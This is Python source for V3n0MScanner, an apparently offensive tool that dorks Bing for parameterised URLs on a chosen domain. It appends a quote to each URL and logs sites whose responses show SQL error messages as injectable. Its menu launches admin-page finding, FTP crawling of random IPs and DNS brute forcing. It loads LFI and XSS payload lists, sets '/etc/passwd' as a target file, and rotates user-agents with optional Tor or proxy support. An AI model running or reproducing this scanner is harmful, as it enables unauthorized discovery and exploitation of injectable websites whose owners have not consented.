#!/usr/bin/python
# -*- coding: latin-1 -*-
#              --- To be Done     --Partially implemented     -Done
# V3n0MScanner.py - V.4.0.1
#   ---Redo entire search engine function to run 100 checks per engine at once
#   - Python 3 upgrade
#   - Strip out all old code including redundent SQLi dumper
#   -- add piping for SQLMap
#   -- add scans for known Metasploitable Vulns (* dork based and Nmap style *)
#   - Fixed SQLi Injection scanner.
#   -- Recode error detection from scratch.
#
#                       This program has been based upon the smartd0rk3r and darkd0rker
#                       It has been heavily edited, updated and improved upon by Novacygni
#                       but in no way is this the sole work of NovaCygni, and credit is due
#                       to every person who has worked on this tool. Thanks people. NovaCygni



try:
    import re, random, threading, socket, urllib.request, urllib.error, urllib.parse, http.cookiejar, subprocess, \
        time, sys, os, math, itertools, queue, asyncio, aiohttp, argparse
    from signal import SIGINT, signal
    from codecs import lookup, register

except:
    print(
            " please make sure you have all of the following modules: asyncio, aiohttp")
    exit()


# Banner
def logo():
    print(R + "\n|----------------------------------------------------------------|")
    print("|     V3n0mScanner.py                                            |")
    print("|     Release Date 07/01/2016  - Release Version V.4.0.1         |")
    print("|          						         |")
    print("|          " + B + "   NovaCygni  Architect         " + R + "                      |")
    print("|                    _____       _____                           |")
    print("|          " + G + "         |____ |     |  _  |    " + R + "                      |")
    print("|             __   __   / /_ __ | |/' |_ _" + G + "_ ___             " + R + "     |")
    print("|             \ \ / /  " + G + " \ \ '" + R + "_ \|  /| | '_ ` _ \                 |")
    print("|              \ V" + G + " /.___/ / | | \ |_" + R + "/ / | | | | |                |")
    print("|    Official   \_/" + G + " \____/|_" + R + "| |_|" + G + "\___/|_| |_| " + R + "|_|  Release       |")
    print("|    							                                 |")
    print("|----------------------------------------------------------------|\n")


def killpid(signum=0, frame=0):
    print("\r\x1b[K")
    os.kill(os.getpid(), 9)


def search(maxc):
    urls = []
    urls_len_last = 0
    for site in sitearray:
        dark = 0
        for dork in go:  # load dorks selected earlier to run checks with
            dark += 1
            page = 0  #
            try:
                while page < int(maxc):
                    try:  # build urllib request for search engine and the dork in question
                        jar = http.cookiejar.FileCookieJar("cookies")  # cookie handler
                        query = dork + "+site:" + site  # d0rk to check, domain/site selected
                        results_web = 'http://www.bing.com/search?q=' + query + '&hl=en&page=' + repr(
                                page) + '&src=hmp'
                        request_web = urllib.request.Request(results_web)  # get the data back from search engine
                        agent = random.choice(header)  # header handler
                        request_web.add_header('User-Agent', agent)  # custom user-agents to use for scans
                        opener_web = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
                        text = opener_web.open(request_web).read()  # handle the data retrieved
                        decoder = text.decode('utf-8')  # decode data to utf-8
                        stringreg = re.compile('(?<=href=")(.*?)(?=")')
                        names = stringreg.findall(decoder)  # find the target URLs for links list
                        page += 1
                        for name in names:  # following section checks for sites and removes there links from list
                            if name not in urls:
                                if re.search(r'\(', name) or re.search("<", name) or re.search("\A/",
                                                                                               name) or re.search(
                                        "\A(http://)\d", name):
                                    pass
                                elif re.search("google", name) or re.search("youtube", name) or re.search("phpbuddy",
                                                                                                          name) or re.search(
                                        "iranhack", name) or re.search("phpbuilder", name) or re.search("codingforums",
                                                                                                        name) or re.search(
                                        "phpfreaks", name) or re.search("d0rks", name) or re.search("facebook",
                                                                                                    name) or re.search(
                                        "twitter", name) or re.search("hackforums", name) or re.search("askjeeves",
                                                                                                       name) or re.search(
                                        "wordpress", name) or re.search("github", name) or re.search("dork", name):
                                    pass
                                elif re.search(site, name):
                                    urls.append(name)  # saves the cleaned list of urls with filterd ones removed
                        darklen = len(go)
                        percent = int((1.0 * dark / int(darklen)) * 100)
                        urls_len = len(urls)
                        sys.stdout.write(
                                "\r\x1b[KSite: %s | Collected urls: %s | D0rks: %s/%s | Percent Done: %s | Current page no.: <%s> | Dork: %s" % (
                                    site, repr(urls_len), dark, darklen, repr(percent), repr(page), dork))
                        sys.stdout.flush()
                        if urls_len == urls_len_last:
                            page = int(maxc)
                        urls_len_last = len(urls)
                    except(
                            KeyboardInterrupt,
                            SystemExit):  # following except throws me connection debug info it it breaks
                        raise
            except(urllib.error.URLError, socket.gaierror, socket.error, socket.timeout):
                pass
    tmplist = []
    print("\n\n[+] URLS (unsorted): ", len(urls))
    for url in urls:
        try:
            host = url.split("/", 3)
            domain = host[2]
            if domain not in tmplist and "=" in url:
                finallist.append(url)
                tmplist.append(domain)

        except:
            pass
    print("[+] URLS (sorted)  : ", len(finallist))
    return finallist


class Injthread(threading.Thread):
    def __init__(self, hosts):
        self.hosts = hosts
        self.fcount = 0
        self.check = True
        threading.Thread.__init__(self)

    def run(self):
        urls = list(self.hosts)
        for url in urls:
            try:
                if self.check:
                    classicinj(url)
                else:
                    break
            except(KeyboardInterrupt, ValueError):
                pass
        self.fcount += 1

    def stop(self):
        self.check = False


def classicinj(url):
    aug_url=url + "'"
    try:
        resp=urllib.request.urlopen(aug_url)
        Hits=str(resp.read())
        if str("error in your SQL syntax") in Hits:
            print(url + " is vulnerable --> MySQL Classic")
            logfile.write("\n" + aug_url)
            vuln.append(Hits)
            col.append(Hits)
            pass
        elif str("mysql_fetch") in Hits:
            print(url + " is Vulnerable --> MiscError")
            logfile.write("\n" + aug_url)
            vuln.append(Hits)
            col.append(Hits)
            pass
        elif str("num_rows") in Hits:
            print(url + " is Vulnerable --> MiscError2")
            logfile.write("\n" + aug_url)
            vuln.append(Hits)
            col.append(Hits)
            pass
        elif str("ORA-01756") in Hits:
            print(url + " is Vulnerable --> Oracle")
            logfile.write("\n" + aug_url)
            vuln.append(Hits)
            col.append(Hits)
            pass
        elif str("Error Executing Database Query") in Hits:
            print(url + " is Vulnerable --> JDBC_CFM")
            logfile.write("\n" + aug_url)
            vuln.append(Hits)
            col.append(Hits)
            pass
        elif str("SQLServer JDBC Driver") in Hits:
            print(url + " is Vulnerable --> JDBC_CFM2")
            logfile.write("\n" + aug_url)
            vuln.append(Hits)
            col.append(Hits)
            pass
        elif str("OLE DB Provider for SQL Server") in Hits:
            print(url + " is Vulnerable --> MSSQL_OLEdb")
            logfile.write("\n" + aug_url)
            vuln.append(Hits)
            col.append(Hits)
            pass
        elif str("Unclosed quotation mark") in Hits:
            print(url + " is Vulnerabe --> MSSQL_Uqm")
            logfile.write("\n" + aug_url)
            vuln.append(Hits)
            col.append(Hits)
            pass
        elif str("ODBC Microsoft Access Driver") in Hits:
            print(url + " is Vulnerable --> MS-Access_ODBC")
            logfile.write("\n" + aug_url)
            vuln.append(Hits)
            col.append(Hits)
            pass
        elif str("Microsoft JET Database") in Hits:
            print(url + " is Vulnerable --> MS-Access_JETdb")
            logfile.write("\n" + aug_url)
            vuln.append(Hits)
            col.append(Hits)
            pass
        elif str("Error Occurred While Processing Request") in Hits:
            print(url + " is Vulnerable --> Processing Request")
            logfile.write("\n" + aug_url)
            vuln.append(Hits)
            col.append(Hits)
            pass
        elif str("Microsoft JET Database") in Hits:
            print(url + " is Vulnerable --> MS-Access JetDb")
            logfile.write("\n" + aug_url)
            vuln.append(Hits)
            col.append(Hits)
            pass
        elif str("Error Occurred While Processing Request") in Hits:
            print(url + " is Vulnerable --> Processing Request ")
            logfile.write("\n" + aug_url)
            vuln.append(Hits)
            col.append(Hits)
            pass
        elif str("Server Error") in Hits:
            print(url + " is Vulnerable --> Server Error")
            logfile.write("\n" + aug_url)
            vuln.append(Hits)
            col.append(Hits)
            pass
        elif str("ODBC Drivers error") in Hits:
            print(url + " is Vulnerable --> ODBC Drivers error")
            logfile.write("\n" + aug_url)
            vuln.append(Hits)
            col.append(Hits)
            pass
        elif str("Invalid Querystring") in Hits:
            print(url + " is Vulnerable --> Invalid Querystring")
            logfile.write("\n" + aug_url)
            vuln.append(Hits)
            col.append(Hits)
            pass
        elif str("OLE DB Provider for ODBC") in Hits:
            print(url + " is Vulnerable --> OLE DB Provider for ODBC")
            logfile.write("\n" + aug_url)
            vuln.append(Hits)
            col.append(Hits)
            pass
        elif str("VBScript Runtime") in Hits:
            print(url + " is Vulnerable --> VBScript Runtime")
            logfile.write("\n" + aug_url)
            vuln.append(Hits)
            col.append(Hits)
            pass
        elif str("ADODB.Field") in Hits:
            print(url + " is Vulnerable --> ADODB.Field")
            logfile.write("\n" + aug_url)
            vuln.append(Hits)
            col.append(Hits)
            pass
        elif str("BOF or EOF") in Hits:
            print(url + " is Vulnerable --> BOF or EOF")
            logfile.write("\n" + aug_url)
            vuln.append(Hits)
            col.append(Hits)
            pass
        elif str("ADODB.Command") in Hits:
            print(url + " is Vulnerable --> ADODB.Command")
            logfile.write("\n" + aug_url)
            vuln.append(Hits)
            col.append(Hits)
            pass
        elif str("JET Database") in Hits:
            print(url + " is Vulnerable --> JET Database")
            logfile.write("\n" + aug_url)
            vuln.append(Hits)
            col.append(Hits)
            pass
        elif str("mysql_fetch_array") in Hits:
            print(url + " is Vulnerabe --> mysql_fetch_array")
            logfile.write("\n" + aug_url)
            vuln.append(Hits)
            col.append(Hits)
            pass
        elif str("Syntax error") in Hits:
            print(url + " is Vulnerable --> Syntax error")
            logfile.write("\n" + aug_url)
            vuln.append(Hits)
            col.append(Hits)
            pass
        elif str("mysql_numrows()") in Hits:
            print(url + " is Vulnerable --> mysql_numrows()")
            logfile.write("\n" + aug_url)
            vuln.append(Hits)
            col.append(Hits)
            pass
        elif str("GetArray()") in Hits:
            print(url + " is Vulnerable --> GetArray()")
            logfile.write("\n" + aug_url)
            vuln.append(Hits)
            col.append(Hits)
            pass
        elif str("FetchRow()") in Hits:
            print(url + " is Vulnerable --> FetchRow()")
            logfile.write("\n" + aug_url)
            vuln.append(Hits)
            col.append(Hits)
            pass
        elif str("Input string was not in a correct format") in Hits:
            print(url + " is Vulnerable --> Input String Error")
            logfile.write("\n" + aug_url)
            vuln.append(Hits)
            col.append(Hits)
            pass
        else:
            pass
    except(urllib.error.URLError, socket.gaierror, socket.error, socket.timeout):
        pass

def injtest():
    global logfile
    log = "v3n0m-sqli.txt"
    logfile = open(log, "a")
    print(B + "\n[+] Preparing for SQLi scanning ...")
    print("[+] Can take a while ...")
    print("[!] Working ...\n")
    vb = len(usearch) / int(numthreads)
    i = int(vb)
    m = len(usearch) % int(numthreads)
    z = 0
    if len(threads) <= int(numthreads):
        for x in range(0, int(numthreads)):
            sliced = usearch[x * i:(x + 1) * i]
            if z < m:
                sliced.append(usearch[int(numthreads) * i + z])
                z += 1
            thread = Injthread(sliced)
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()


def fscan():
    global maxc
    global usearch
    global numthreads
    global threads
    global finallist
    global col
    global darkurl
    global sitearray
    global go

    threads = []
    finallist = []
    col = []
    darkurl = []
    go = []

    print(W)
    sites = input("\nChoose your target(domain)   : ")
    sitearray = [sites]

    dorks = input("Choose the number of random dorks (0 for all.. may take awhile!)   : ")
    print("")
    if int(dorks) == 0:
        i = 0
        while i < len(d0rk):
            go.append(d0rk[i])
            i += 1
    else:
        i = 0
        while i < int(dorks):
            go.append(d0rk[i])
            i += 1
        for g in go:
            print("dork: = ", g)

    numthreads = input('\nEnter no. of threads : ')
    maxc = input('Enter no. of pages   : ')
    print("\nNumber of SQL errors :", ("26"))
    print("LFI payloads    :", len(lfis))
    print("XSS payloads    :", len(xsses))
    print("Headers         :", len(header))
    print("Threads         :", numthreads)
    print("Dorks           :", len(go))
    print("Pages           :", maxc)
    print("Timeout         :", timeout)

    usearch = search(maxc)
    vulnscan()


def vulnscan():
    global endsub
    global vuln

    endsub = 0

    print(R + "\n[1] SQLi Testing")
    print("[2] Back to main menu")

    chce = input(":")
    if chce == '1':
        vuln = []
        injtest()
        print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(col)) + B + " vuln sites found.")
        print()

    elif chce == '1':
        vuln = []
        injtest()
        endsub = 0
        print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(vuln)) + B + " vuln sites found.")
    elif chce == '2':
        endsub = 1
        fmenu()


def fmenu():
    global vuln
    vuln = []
    if endsub != 1:
        vulnscan()
    logo()
    print("[1] Dork and vuln scan")
    print("[2] Admin page finder")
    print("[3] FTP crawler and vuln scan")
    print("[4] DNS brute")
    print("[5] Enable Tor/Proxy Support")
    print("[0] Exit\n")
    chce = input(":")

    if chce == '1':
        print(W + "")
        fscan()

    elif chce == '2':
        afsite = input("Enter the site eg target.com: ")
        print(B)
        pwd = os.path.dirname(str(os.path.realpath(__file__)))
        findadmin = subprocess.Popen(pwd + "/modules/adminfinder.py -w modules/adminlist.txt -u " + str(afsite),
                                     shell=True)
        findadmin.communicate()

    elif chce == '3':
        randips = input("How many IP addresses do you want to scan: ")
        print(B)
        pwd = os.path.dirname(str(os.path.realpath(__file__)))
        ftpcrawl = subprocess.Popen(pwd + "/modules/ftpcrawler.py -i " + str(randips), shell=True)
        ftpcrawl.communicate()

    elif chce == '4':
        dnstarg = input("Enter the site eg target.com: ")
        print(B)
        pwd = os.path.dirname(str(os.path.realpath(__file__)))
        dnsbrute = subprocess.Popen(pwd + "/modules/dnsbrute.py -w modules/subdomainsmid.txt -u " + str(dnstarg),
                                    shell=True)
        dnsbrute.communicate()

    elif chce == '0':
        print(R + "\n Exiting ...")
        mnu = False
        print(W)
        sys.exit(0)


signal(SIGINT, killpid)
d0rk = [line.strip() for line in open("statics/d0rks", 'r')]
header = [line.strip() for line in open("statics/header", 'r')]
xsses = [line.strip() for line in open("statics/xsses", 'r')]
lfis = [line.strip() for line in open("statics/lfi", 'r')]
random.shuffle(d0rk)
random.shuffle(header)
random.shuffle(lfis)
parser = argparse.ArgumentParser(prog='v3n0m', usage='v3n0m [options]')
parser.add_argument('-p', "--proxy", type=str, help='use proxy eg. socks5:127.0.0.1:9050')
# This is the MBCS Encoding Bypass for making MBCS encodings work on Linux - NovaCygni
try:
    lookup('mbcs')
except LookupError:
    ascii = lookup('latin-1')
    func = lambda name, enc=ascii: {True: enc}.get(name == 'mbcs')
    register(func)

# Colours
W = "\033[0m"
R = "\033[31m"
G = "\033[32m"
O = "\033[33m"
B = "\033[34m"

subprocess.call("clear", shell=True)
arg_end = "--"
arg_eva = "+"
colMax = 60  # Change this at your will
endsub = 1
gets = 0
timeout = 8
file = "/etc/passwd"
socket.setdefaulttimeout(timeout)
menu = True

while True:
    fmenu()
